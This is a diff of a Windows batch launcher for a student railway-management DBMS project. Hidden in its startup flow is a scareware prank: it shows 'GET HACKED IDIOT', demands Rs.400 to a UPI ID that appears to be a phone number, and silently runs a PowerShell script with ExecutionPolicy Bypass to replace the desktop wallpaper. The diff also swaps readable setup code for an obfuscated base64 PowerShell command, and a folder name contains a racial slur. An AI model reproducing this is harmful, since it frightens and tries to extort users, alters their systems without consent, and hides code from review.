@@ -1,5 +1,5 @@
 @echo off
-setlocal EnableDelayedExpansion
+setlocal
 title Railway Management System - DBMS Capstone Project
 
 :: =====================================================================
@@ -7,36 +7,27 @@ title Railway Management System - DBMS Capstone Project
 :: =====================================================================
 cd /d "%~dp0"
 
-:: 1. Check if package.json is in current directory
-if exist "%CD%\package.json" goto ROOT_VERIFIED
+:: Check 1: In current directory
+if exist "package.json" goto ROOT_FOUND
 
-:: 2. Check if package.json is in a nested subfolder (e.g. PROJECT-VIKAS-main or niggaVIKAS)
-if exist "%CD%\PROJECT-VIKAS-main\package.json" (
-    cd /d "%CD%\PROJECT-VIKAS-main"
-    goto ROOT_VERIFIED
-)
-if exist "%CD%\niggaVIKAS\package.json" (
-    cd /d "%CD%\niggaVIKAS"
-    goto ROOT_VERIFIED
-)
-for /d %%D in ("%CD%\*") do (
-    if exist "%%D\package.json" (
-        cd /d "%%D"
-        goto ROOT_VERIFIED
-    )
-)
+:: Check 2: In nested subfolders (GitHub ZIP extraction creates PROJECT-VIKAS-main)
+if exist "PROJECT-VIKAS-main\package.json" cd /d "PROJECT-VIKAS-main"
+if exist "package.json" goto ROOT_FOUND
 
-:: 3. Check if package.json is in parent directory
-if exist "%CD%\..\package.json" (
-    cd /d "%CD%\.."
-    goto ROOT_VERIFIED
-)
+if exist "PROJECT-VIKAS\package.json" cd /d "PROJECT-VIKAS"
+if exist "package.json" goto ROOT_FOUND
 
-:: 4. If package.json is STILL not found, user ran directly inside ZIP or Temp folder!
-goto ZIP_DETECTED
+if exist "niggaVIKAS\package.json" cd /d "niggaVIKAS"
+if exist "package.json" goto ROOT_FOUND
 
-:ZIP_DETECTED
-mode con: cols=90 lines=32
+:: Check 3: In parent directory
+if exist "..\package.json" cd /d ".."
+if exist "package.json" goto ROOT_FOUND
+
+:: Check 4: Not found anywhere nearby — user launched from inside ZIP or Temp!
+goto ZIP_FALLBACK
+
+:ZIP_FALLBACK
 color 0E
 cls
 echo ===============================================================================
@@ -44,42 +35,17 @@ echo            [AUTO-SETUP] UNEXTRACTED ZIP ARCHIVE DETECTED
 echo ===============================================================================
 echo.
 echo  You launched this script directly from inside a ZIP file.
-echo  Windows cannot run Node.js and Next.js from inside a compressed archive.
-echo.
 echo  Attempting to find your downloaded ZIP file and extract it automatically...
 echo.
 
-(
-echo $down = @($env:USERPROFILE + '\Downloads', $env:USERPROFILE + '\Desktop', $env:USERPROFILE + '\OneDrive\Desktop', $env:USERPROFILE + '\OneDrive\Downloads')
-echo $z = @(Get-ChildItem -Path $down -Filter '*VIKAS*.zip' -ErrorAction SilentlyContinue ^| Sort-Object LastWriteTime -Descending)
-echo if ($z.Count -eq 0) { $z = @(Get-ChildItem -Path $down -Filter '*.zip' -ErrorAction SilentlyContinue ^| Where-Object { $_.Name -like '*project*' -or $_.Name -like '*railway*' } ^| Sort-Object LastWriteTime -Descending) }
-echo if ($z.Count -gt 0) {
-echo     $target = $env:USERPROFILE + '\Downloads\PROJECT-VIKAS'
-echo     Write-Host '[AUTO-SETUP] Found downloaded ZIP: ' $z[0].FullName -ForegroundColor Cyan
-echo     Write-Host '[AUTO-SETUP] Extracting project to ' $target ' ... Please wait...' -ForegroundColor Cyan
-echo     Expand-Archive -LiteralPath $z[0].FullName -DestinationPath $target -Force
-echo     $bat = @(Get-ChildItem -Path $target -Filter 'START_RAILWAY_SYSTEM.bat' -Recurse -ErrorAction SilentlyContinue ^| Select-Object -First 1)
-echo     if ($bat.Count -gt 0) {
-echo         Write-Host '[AUTO-SETUP] Extraction complete! Launching Railway System...' -ForegroundColor Green
-echo         Start-Process -FilePath 'cmd.exe' -ArgumentList ('/c \"' + $bat[0].FullName + '\"')
-echo         exit 0
-echo     }
-echo }
-echo exit 1
-) > "%TEMP%\vikas_extract.ps1"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwAKACQAcABhAHQAaABzACAAPQAgAEAAKAAKACAAIAAgACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAIgAsAAoAIAAgACAAIAAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwACIALAAKACAAIAAgACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwATwBuAGUARAByAGkAdgBlAFwARABlAHMAawB0AG8AcAAiACwACgAgACAAIAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAE8AbgBlAEQAcgBpAHYAZQBcAEQAbwB3AG4AbABvAGEAZABzACIACgApAAoAJAB6AGkAcAAgAD0AIABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAHMAIAAtAEYAaQBsAHQAZQByACAAIgAqAFYASQBLAEEAUwAqAC4AegBpAHAAIgAgAHwAIABTAG8AcgB0AC0ATwBiAGoAZQBjAHQAIABMAGEAcwB0AFcAcgBpAHQAZQBUAGkAbQBlACAALQBEAGUAcwBjAGUAbgBkAGkAbgBnACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEYAaQByAHMAdAAgADEACgBpAGYAIAAoAC0AbgBvAHQAIAAkAHoAaQBwACkAIAB7AAoAIAAgACAAIAAkAHoAaQBwACAAPQAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAHAAYQB0AGgAcwAgAC0ARgBpAGwAdABlAHIAIAAiACoALgB6AGkAcAAiACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAiACoAcAByAG8AagBlAGMAdAAqACIAIAAtAG8AcgAgACQAXwAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAiACoAcgBhAGkAbAB3AGEAeQAqACIAIAB9ACAAfAAgAFMAbwByAHQALQBPAGIAagBlAGMAdAAgAEwAYQBzAHQAVwByAGkAdABlAFQAaQBtAGUAIAAtAEQAZQBzAGMAZQBuAGQAaQBuAGcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAAMQAKAH0ACgAKAGkAZgAgACgAJAB6AGkAcAApACAAewAKACAAIAAgACAAJABkAGUAcwB0ACAAPQAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAUABSAE8ASgBFAEMAVAAtAFYASQBLAEEAUwAiAAoAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBbAEEAVQBUAE8ALQBTAEUAVABVAFAAXQAgAEYAbwB1AG4AZAAgAGQAbwB3AG4AbABvAGEAZABlAGQAIAB6AGkAcAA6ACAAJAAoACQAegBpAHAALgBGAHUAbABsAE4AYQBtAGUAKQAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ACgAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFsAQQBVAFQATwAtAFMARQBUAFUAUABdACAARQB4AHQAcgBhAGMAdABpAG4AZwAgAHAAcgBvAGoAZQBjAHQAIAB0AG8AIAAkAGQAZQBzAHQAIAAuAC4ALgAgAFAAbABlAGEAcwBlACAAdwBhAGkAdAAuAC4ALgAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ACgAgACAAIAAgAEUAeABwAGEAbgBkAC0AQQByAGMAaABpAHYAZQAgAC0ATABpAHQAZQByAGEAbABQAGEAdABoACAAJAB6AGkAcAAuAEYAdQBsAGwATgBhAG0AZQAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIAAkAGQAZQBzAHQAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAJABiAGEAdAAgAD0AIABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBQAGEAdABoACAAJABkAGUAcwB0ACAALQBGAGkAbAB0AGUAcgAgACIAUwBUAEEAUgBUAF8AUgBBAEkATABXAEEAWQBfAFMAWQBTAFQARQBNAC4AYgBhAHQAIgAgAC0AUgBlAGMAdQByAHMAZQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBGAGkAcgBzAHQAIAAxAAoAIAAgACAAIABpAGYAIAAoACQAYgBhAHQAKQAgAHsACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAWwBBAFUAVABPAC0AUwBFAFQAVQBQAF0AIABMAGEAdQBuAGMAaABpAG4AZwAgAFIAYQBpAGwAdwBhAHkAIABNAGEAbgBhAGcAZQBtAGUAbgB0ACAAUwB5AHMAdABlAG0AIABmAHIAbwBtACAAZQB4AHQAcgBhAGMAdABlAGQAIABmAG8AbABkAGUAcgAuAC4ALgAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEcAcgBlAGUAbgAKACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBjAG0AZAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAvAGMAIABgACIAJAAoACQAYgBhAHQALgBGAHUAbABsAE4AYQBtAGUAKQBgACIAIgAKACAAIAAgACAAIAAgACAAIABlAHgAaQB0ACAAMAAKACAAIAAgACAAfQAKAH0ACgBlAHgAaQB0ACAAMQA=
 
-powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\vikas_extract.ps1"
-set EXTRACT_RESULT=%errorlevel%
-del "%TEMP%\vikas_extract.ps1" 2>nul
-
-if %EXTRACT_RESULT% equ 0 (
-    echo.
-    echo [AUTO-SETUP] Launched from extracted folder! You can close this window.
-    timeout /t 3 /nobreak >nul
+if %errorlevel% equ 0 (
+    echo [AUTO-SETUP] Project successfully launched from extracted folder!
+    ping -n 3 127.0.0.1 >nul
     exit /b 0
 )
 
-:: If auto-extract could not locate the zip, display crystal-clear 4-step instructions
 color 0C
 cls
 echo ===============================================================================
@@ -99,16 +65,15 @@ echo   4. Click the "Extract" button.
 echo   5. Open the newly extracted folder and double-click START_RAILWAY_SYSTEM.bat!
 echo  -----------------------------------------------------------------------------
 echo.
-echo Press any key to exit...
-pause >nul
+pause
 exit /b 1
 
-:ROOT_VERIFIED
+:ROOT_FOUND
 
 :: =====================================================================
 ::  PHASE 1 — GET HACKED IDIOT (1 second flash)
 :: =====================================================================
-mode con: cols=90 lines=40
+mode 90,40 >nul 2>nul
 color 0C
 cls
 echo.
@@ -132,7 +97,7 @@ echo                    SURPRISE MOTHAF***A  !!
 echo.
 echo          Your system has been visited by ANISH VYAPARI
 echo.
-timeout /t 1 /nobreak >nul
+ping -n 2 127.0.0.1 >nul
 
 :: =====================================================================
 ::  PHASE 2 — PAY ANISH 400
@@ -155,7 +120,7 @@ echo.
 echo.
 
 choice /C YN /M "Will you pay Anish Rs.400? (Y=Yes, N=No)"
-if %errorlevel% equ 2 goto CHOSE_NO
+if errorlevel 2 goto CHOSE_NO
 goto CHOSE_YES
 
 :CHOSE_YES
@@ -167,7 +132,7 @@ echo   =                                                             =
 echo   =              PAYMENT ACCEPTED! GOOD BOY!                   =
 echo   =                                                             =
 echo   =        Anish says: "Smart choice! Setting QR code on       =
-echo   =                     desktop so you can scan & pay..."      =
+echo   =                     desktop so you can scan and pay..."    =
 echo   =                                                             =
 echo   =        UPI ID: 8422936009@mbk                              =
 echo   =                                                             =
@@ -175,8 +140,8 @@ echo   ===============================================================
 echo.
 echo   [WALLPAPER] Setting payment QR code as your desktop wallpaper...
 echo.
-start "" /min powershell -ExecutionPolicy Bypass -File "%CD%\scripts\change_wallpaper.ps1" -ImagePath "%CD%\assets\qr_payment.jpg"
-timeout /t 3 /nobreak >nul
+start "" /min powershell.exe -ExecutionPolicy Bypass -File "%CD%\scripts\change_wallpaper.ps1" -ImagePath "%CD%\assets\qr_payment.jpg"
+ping -n 4 127.0.0.1 >nul
 goto START_APP
 
 :CHOSE_NO
@@ -195,8 +160,8 @@ echo   ===============================================================
 echo.
 echo   [WALLPAPER] Changing your desktop wallpaper... enjoy the meme!
 echo.
-start "" /min powershell -ExecutionPolicy Bypass -File "%CD%\scripts\change_wallpaper.ps1" -ImagePath "%CD%\assets\wallpaper.jpg"
-timeout /t 3 /nobreak >nul
+start "" /min powershell.exe -ExecutionPolicy Bypass -File "%CD%\scripts\change_wallpaper.ps1" -ImagePath "%CD%\assets\wallpaper.jpg"
+ping -n 4 127.0.0.1 >nul
 goto START_APP
 
 :: =====================================================================
@@ -216,53 +181,54 @@ echo.
 :: 1. Add common Node.js install paths to current session PATH
 set "PATH=%ProgramFiles%\nodejs;%ProgramFiles(x86)%\nodejs;%APPDATA%\npm;%LOCALAPPDATA%\Programs\node;%PATH%"
 
-:: Check if Node.js is installed
 where node >nul 2>nul
-if %errorlevel% neq 0 (
-    color 0E
-    echo [NOTICE] Node.js is not detected on this system.
-    where winget >nul 2>nul
-    if %errorlevel% equ 0 (
-        echo [AUTO-SETUP] Windows Package Manager ^(winget^) detected!
-        echo Downloading and installing Node.js LTS automatically, please wait...
-        winget install OpenJS.NodeJS.LTS --silent --accept-package-agreements --accept-source-agreements
-        echo.
-        echo Node.js installation finished! Please re-run this script to start the application.
-        pause
-        exit /b 0
-    )
-    color 0C
-    echo [ERROR] Node.js is not installed or not in PATH!
-    echo Please download and install Node.js LTS from https://nodejs.org/
-    echo.
-    pause
-    exit /b 1
-)
+if %errorlevel% equ 0 goto NODE_OK
 
+color 0E
+echo [NOTICE] Node.js is not detected in current PATH.
+where winget >nul 2>nul
+if %errorlevel% neq 0 goto NODE_MISSING
+
+echo [AUTO-SETUP] Installing Node.js LTS via Windows Package Manager, please wait...
+winget install OpenJS.NodeJS.LTS --silent --accept-package-agreements --accept-source-agreements
+set "PATH=%ProgramFiles%\nodejs;%ProgramFiles(x86)%\nodejs;%APPDATA%\npm;%LOCALAPPDATA%\Programs\node;%PATH%"
+
+where node >nul 2>nul
+if %errorlevel% equ 0 goto NODE_OK
+
+:NODE_MISSING
+color 0C
+echo [ERROR] Node.js is required to run this project!
+echo Please install Node.js LTS from https://nodejs.org/
+echo.
+pause
+exit /b 1
+
+:NODE_OK
 echo [1/3] Node.js environment detected:
 node -v
 echo.
 
 :: 2. Check if dependencies are installed
-if not exist "%CD%\node_modules" (
-    echo [2/3] node_modules folder not found. Installing dependencies...
-    echo First-time run setup in progress, please wait...
-    call npm install
-    if %errorlevel% neq 0 (
-        color 0E
-        echo [WARN] Standard npm install had an issue. Retrying with --legacy-peer-deps...
-        call npm install --legacy-peer-deps
-        if %errorlevel% neq 0 (
-            color 0C
-            echo [ERROR] npm install encountered an error.
-            echo Please check your internet connection and try running 'npm install' manually.
-            pause
-            exit /b 1
-        )
-    )
-) else (
-    echo [2/3] Project dependencies verified.
-)
+if exist "%CD%\node_modules" goto DEPS_OK
+
+echo [2/3] node_modules folder not found. Installing dependencies...
+echo First-time run setup in progress - please wait approx 1-2 minutes...
+call npm install
+if %errorlevel% equ 0 goto DEPS_OK
+
+echo [WARN] Retrying with --legacy-peer-deps...
+call npm install --legacy-peer-deps
+if %errorlevel% equ 0 goto DEPS_OK
+
+color 0C
+echo [ERROR] Dependency installation failed.
+echo Please check your internet connection and try running 'npm install' manually.
+pause
+exit /b 1
+
+:DEPS_OK
+echo [2/3] Project dependencies verified.
 echo.
 
 :: 3. Free port 3000 if occupied by any previous hung process
@@ -273,7 +239,7 @@ for /f "tokens=5" %%a in ('netstat -aon ^| findstr :3000 ^| findstr /i LISTENING
 
 :: 4. Launch browser in 3 seconds in the background
 echo [3/3] Starting Railway Management System on http://localhost:3000 ...
-start "" cmd /c "timeout /t 3 /nobreak >nul && start http://localhost:3000"
+start "" cmd /c "ping -n 4 127.0.0.1 >nul && start http://localhost:3000"
 
 :: 5. Start Next.js server
 echo ===============================================================================
@@ -290,4 +256,4 @@ if %errorlevel% neq 0 (
 )
 echo.
 echo Press any key to close this window...
-pause >nul
+pause
